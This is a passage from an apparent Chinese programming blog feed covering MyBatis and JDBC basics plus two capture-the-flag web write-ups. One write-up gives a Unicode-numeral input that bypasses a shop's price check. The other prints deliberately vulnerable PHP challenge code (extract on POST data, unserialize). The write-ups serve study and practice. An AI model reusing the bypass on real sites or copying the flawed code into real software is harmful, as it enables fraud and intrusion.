class="hljs-string">&quot;jdbc:mysql://localhost:3306/security&quot;</span>/&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;root&quot;</span>/&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;root&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">environment</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">environments</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mappers</span>&gt;</span><br><span class="hljs-comment">&lt;!--        加载SQL的映射文件--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">resource</span>=<span class="hljs-string">&quot;StudentMapper.xml&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">mappers</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br></code></pre></td></tr></table></figure><p>修改<code>driver</code>、<code>url</code>、<code>username</code>、<code>password</code>，然后下面的<code>mapper</code>之后修改；</p><p><strong>编写映射文件</strong></p><p>配置文件中的Mapper的作用就是配置要进行的操作，比如说这里要查询<code>student</code>表，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span></span><br><span class="hljs-meta">        <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;https://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;test&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectStudent&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;learn.entity.pojo.Student&quot;</span>&gt;</span><br>        select * from student;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span><br></code></pre></td></tr></table></figure><p>其中<code>namespace</code>是命名空间，一个命名空间中可以进行多个操作；接着节点<code>select</code>就是进行查询，同样会有<code>update</code>、<code>insert</code>等操作，属性<code>id</code>需要保证这个操作是唯一的，<code>resultType</code>需要指定一个pojo类来确定返回数据的类型，设置为数据表中的所有列，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br><br>    <span class="hljs-keyword">private</span> Integer id;<br>    <span class="hljs-keyword">private</span> String student_id;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> String gender;<br>    <span class="hljs-keyword">private</span> Integer age;<br>    <span class="hljs-keyword">private</span> String telephone;<br>    <span class="hljs-keyword">private</span> String address;<br>    <span class="hljs-comment">// ..........</span><br>    <span class="hljs-comment">// ..........</span><br>&#125;<br></code></pre></td></tr></table></figure><p>设置好映射文件后需要在配置文件中指定。</p><p><strong>编码</strong></p><p>直接给出代码，在官网中有实例模板，大都是复制的，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> learn.entity;<br><br><span class="hljs-keyword">import</span> learn.entity.pojo.Student;<br><span class="hljs-keyword">import</span> org.apache.ibatis.io.Resources;<br><span class="hljs-keyword">import</span> org.apache.ibatis.session.SqlSession;<br><span class="hljs-keyword">import</span> org.apache.ibatis.session.SqlSessionFactory;<br><span class="hljs-keyword">import</span> org.apache.ibatis.session.SqlSessionFactoryBuilder;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyBatis</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// 加载mybatis核心配置文件，获取SqlSessionFactory对象</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">resource</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;mybatis-config.xml&quot;</span>;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Resources.getResourceAsStream(resource);<br>        <span class="hljs-type">SqlSessionFactory</span> <span class="hljs-variable">sqlSessionFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SqlSessionFactoryBuilder</span>().build(inputStream);<br><br>        <span class="hljs-comment">// 获取SqlSession对象，执行SQL语句</span><br>        <span class="hljs-type">SqlSession</span> <span class="hljs-variable">sqlSession</span> <span class="hljs-operator">=</span> sqlSessionFactory.openSession();<br><br>        <span class="hljs-comment">// 执行SQL语句，`命名空间.id`</span><br>        List&lt;Student&gt; students = sqlSession.selectList(<span class="hljs-string">&quot;test.selectStudent&quot;</span>);<br><br>        System.out.println(students);<br><br>        <span class="hljs-comment">// 释放资源</span><br>        sqlSession.close();<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>jdbc</tag>
      
      <tag>mybatis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] ASIS2019-UnicornShop</title>
    <link href="/2023/01/09/%5Bctf-web%5D%20ASIS2019-UnicornShop/"/>
    <url>/2023/01/09/%5Bctf-web%5D%20ASIS2019-UnicornShop/</url>
    
    <content type="html"><![CDATA[<h1 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h1><p>进入就发现是卖独角兽的，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230109201440833.png" alt="image-20230109201440833"></p><p>下面有个购买的输入：</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230109201510098.png" alt="image-20230109201510098"></p><p>输入ID和价格应该就可以购买了，但是输入<code>id=1;price=4</code>后显示了错误，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230109201637085.png" alt="image-20230109201637085"></p><p>依次尝试，直到输入了<code>id=4;price=1444</code>，显示了其他信息，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230109201755959.png" alt="image-20230109201755959"></p><p>然后没有输入任何的信息，得到了一个python的错误，</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Traceback (most recent call <span class="hljs-keyword">last</span>):<br>  File <span class="hljs-string">&quot;/usr/local/lib/python2.7/site-packages/tornado/web.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">1541</span>, <span class="hljs-keyword">in</span> <span class="hljs-title">_execute</span><br>    <span class="hljs-built_in">result</span> = method(*self.path_args, **self.path_kwargs)<br>  File <span class="hljs-string">&quot;/app/sshop/views/Shop.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">34</span>, <span class="hljs-keyword">in</span> <span class="hljs-built_in">post</span><br>    unicodedata.<span class="hljs-keyword">numeric</span>(price)<br>TypeError: need <span class="hljs-keyword">a</span> single Unicode <span class="hljs-keyword">character</span> <span class="hljs-keyword">as</span> parameter<br></code></pre></td></tr></table></figure><p>查看相关的信息，<code>unicodedata.numeric()</code>的功能是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> unicodedata<br><br><span class="hljs-built_in">print</span>(unicodedata.numeric(<span class="hljs-string">&#x27;4&#x27;</span>))<br><span class="hljs-comment"># 4.0</span><br><span class="hljs-built_in">print</span>(unicodedata.numeric(<span class="hljs-string">&#x27;八&#x27;</span>))<br><span class="hljs-comment"># 8.0</span><br><span class="hljs-built_in">print</span>(unicodedata.numeric(<span class="hljs-string">&#x27;百&#x27;</span>))<br><span class="hljs-comment"># 100.0</span><br><span class="hljs-built_in">print</span>(unicodedata.numeric(<span class="hljs-string">&#x27;一百&#x27;</span>))<br><span class="hljs-comment"># 出现错误</span><br></code></pre></td></tr></table></figure><p>这个函数的意思就是把一个表示数字的字符串转换为浮点数。</p><p>那么最后输入<code>id=4;price=万</code>，得到flag。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[java] jdbc简介</title>
    <link href="/2023/01/08/%5Bjava%5D%20jdbc%E7%AE%80%E4%BB%8B/"/>
    <url>/2023/01/08/%5Bjava%5D%20jdbc%E7%AE%80%E4%BB%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="jdbc简介"><a href="#jdbc简介" class="headerlink" title="jdbc简介"></a>jdbc简介</h1><blockquote><p><a href="https://blog.csdn.net/guanmao4322/article/details/84846647">java JDBC连接数据库步骤及代码_夏沐_lk的博客-CSDN博客_jdbc怎么连接数据库</a></p><p><a href="https://zhuanlan.zhihu.com/p/140885502">什么是JDBC？这篇文章告诉你 - 知乎 (zhihu.com)</a></p><p><a href="https://blog.csdn.net/weixin_40055163/article/details/120762277">JDBC介绍_学无止路的博客-CSDN博客_jdbc</a></p></blockquote><p>JDBC的全称是Java数据库连接(Java Database connect)，它是一套用于执行SQL语句的Java API。应用程序可通过这套API连接到关系数据库，并使用SQL语句来完成对数据库中数据的查询、更新和删除等操作。应用程序使用JDBC访问数据库的方式如下图所示：</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/57c4b7f65edb73fcd1b6d52876bdeb96_1440w.webp" alt="img"></p><p>应用程序使用JDBC访问特定的数据库时，需要与不同的数据库驱动进行连接。由于不同数据库厂商提供的数据库驱动不同，因此，为了使应用程序与数据库真正建立连接，JDBC不仅需要提供访问数据库的API，还需要封装与各种数据库服务器通信的细节，下图描述了JDBC的具体实现细节：</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230108210833948.png" alt="image-20230108210833948"></p><p>可以看到，JDBC的实现包括三个部分：</p><ol><li>JDBC驱动管理器：负责注册特定的JDBC驱动器，主要通过<code>java.sql.DriverManager</code>类实现；</li><li>JDBC驱动器API：由Sun公司负责制定，其中最主要的接口是<code>java.sql.Driver</code>接口；</li><li>JDBC驱动器：它是一种数据库驱动，由数据库厂商创建，也称为JDBC驱动程序JDBC驱动器实现了JDBC驱动器API，负责与特定的数据库连接，以及处理通信细节。</li></ol><h2 id="JDBC入门"><a href="#JDBC入门" class="headerlink" title="JDBC入门"></a>JDBC入门</h2><p>使用JDBC首先要添加依赖，使用Maven添加：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.1.47<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这个依赖的版本和数据库版本是有关的，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230108220038889.png" alt="image-20230108220038889"></p><p>通常JDBC的操作流程为：</p><ol><li>加载驱动</li><li>获取连接</li><li>创建Statement</li><li>执行SQL</li><li>处理结果</li><li>释放资源</li></ol><p><strong>加载JDBC驱动程序</strong></p><p>连接数据库之前需要加载对应的驱动到JVM，比如加载MySQL驱动：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Class.forName(<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>);<br></code></pre></td></tr></table></figure><p><strong>连接数据库</strong></p><p>连接数据库通常需要提供URL、用户名和密码。这里的URL格式为：<code>协议:子协议:数据源标识</code>，比如MySQL的URL通常为：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">jdbc:</span><span class="hljs-symbol">mysql:</span>//&lt;hostname&gt;<span class="hljs-symbol">:&lt;port&gt;/&lt;db&gt;</span><br></code></pre></td></tr></table></figure><p>建立连接代码为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:mysql://localhost:3306/security&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> DriverManager.getConnection(url, username, password);<br></code></pre></td></tr></table></figure><p><strong>创建Statement</strong></p><p>要执行SQL语句，必须获得<code>java.sql.Statement</code>实例，Statement实例分为三种：</p><ul><li>执行静态SQL语句。通常通过<code>Statement</code>实例实现。</li><li>执行动态SQL语句。通常通过<code>PreparedStatement</code>实例实现。</li><li>执行数据库存储过程。通常通过<code>CallableStatement</code>实例实现。</li></ul><p>代码为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Statement</span> <span class="hljs-variable">statement</span> <span class="hljs-operator">=</span> connection.createStatement();<br></code></pre></td></tr></table></figure><p><strong>执行SQL语句</strong></p><p>Statement接口提供了三种执行SQL语句的方法：</p><ol><li><code>ResultSet executeQuery(String sqlString)</code>：执行查询数据库的SQL语句   ，返回一个结果集（ResultSet）对象；</li><li><code>int executeUpdate(String sqlString)</code>：用于执行<code>INSERT</code>、<code>UPDATE</code>或<code>DELETE</code>语句以及SQL DDL语句，如：<code>CREATE TABLE</code>和<code>DROP TABLE</code>等；</li><li><code>execute(sqlString)</code>:用于执行返回多个结果集、多个更新计数或二者组合的语句；</li></ol><p>代码为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from student&quot;</span>;<br><br><span class="hljs-type">ResultSet</span> <span class="hljs-variable">resultSet</span> <span class="hljs-operator">=</span> statement.executeQuery(sql);<br></code></pre></td></tr></table></figure><p><strong>结果处理</strong></p><p>有两种情况：</p><ul><li>执行更新返回的是本次操作影响到的记录数</li><li>执行查询返回的结果是一个ResultSet对象</li></ul><p><code>ResultSet</code>包含符合SQL语句中条件的所有行，并且它通过一套get方法提供了对这些行中数据的访问。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">while</span> (resultSet.next())&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> resultSet.getString(<span class="hljs-string">&quot;student_id&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> resultSet.getString(<span class="hljs-string">&quot;name&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">gender</span> <span class="hljs-operator">=</span> resultSet.getString(<span class="hljs-string">&quot;gender&quot;</span>);<br>    System.out.println(<span class="hljs-string">&quot;--&gt; &quot;</span> + id + <span class="hljs-string">&quot; == &quot;</span> + name + <span class="hljs-string">&quot; == &quot;</span> + gender);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>释放资源</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (resultSet != <span class="hljs-literal">null</span>)&#123;<br>    resultSet.close();<br>&#125;<br><span class="hljs-keyword">if</span> (statement != <span class="hljs-literal">null</span>)&#123;<br>    statement.close();<br>&#125;<br><span class="hljs-keyword">if</span> (connection != <span class="hljs-literal">null</span>)&#123;<br>    connection.close();<br>&#125;<br></code></pre></td></tr></table></figure><p>最后的代码为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> learn.entity;<br><br><span class="hljs-keyword">import</span> java.sql.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyJdbc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:mysql://localhost:3306/security&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;root&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;root&quot;</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            Class.forName(<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>);<br>            <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> DriverManager.getConnection(url, username, password);<br>            <span class="hljs-type">Statement</span> <span class="hljs-variable">statement</span> <span class="hljs-operator">=</span> connection.createStatement();<br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from student&quot;</span>;<br><br>            <span class="hljs-type">ResultSet</span> <span class="hljs-variable">resultSet</span> <span class="hljs-operator">=</span> statement.executeQuery(sql);<br>            <span class="hljs-keyword">while</span> (resultSet.next())&#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> resultSet.getString(<span class="hljs-string">&quot;student_id&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> resultSet.getString(<span class="hljs-string">&quot;name&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">gender</span> <span class="hljs-operator">=</span> resultSet.getString(<span class="hljs-string">&quot;gender&quot;</span>);<br>                System.out.println(<span class="hljs-string">&quot;--&gt; &quot;</span> + id + <span class="hljs-string">&quot; == &quot;</span> + name + <span class="hljs-string">&quot; == &quot;</span> + gender);<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (resultSet != <span class="hljs-literal">null</span>)&#123;<br>                resultSet.close();<br>            &#125;<br>            <span class="hljs-keyword">if</span> (statement != <span class="hljs-literal">null</span>)&#123;<br>                statement.close();<br>            &#125;<br>            <span class="hljs-keyword">if</span> (connection != <span class="hljs-literal">null</span>)&#123;<br>                connection.close();<br>            &#125;<br><br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException | SQLException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>jdbc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] 安洵杯2019-EasySerializePHP</title>
    <link href="/2023/01/08/%5Bctf-web%5D%20%E5%AE%89%E6%B4%B5%E6%9D%AF2019-EasySerializePHP/"/>
    <url>/2023/01/08/%5Bctf-web%5D%20%E5%AE%89%E6%B4%B5%E6%9D%AF2019-EasySerializePHP/</url>
    
    <content type="html"><![CDATA[<h1 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h1><p>进入就是源码，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$function</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>)&#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>&#125;<br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br><br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$function</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br><br><span class="hljs-variable">$serialize_info</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_SESSION</span>));<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;highlight_file&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span><br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;show_image&#x27;</span>)&#123;<br>    <span class="hljs-variable">$userinfo</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serialize_info</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$userinfo</span>[<span 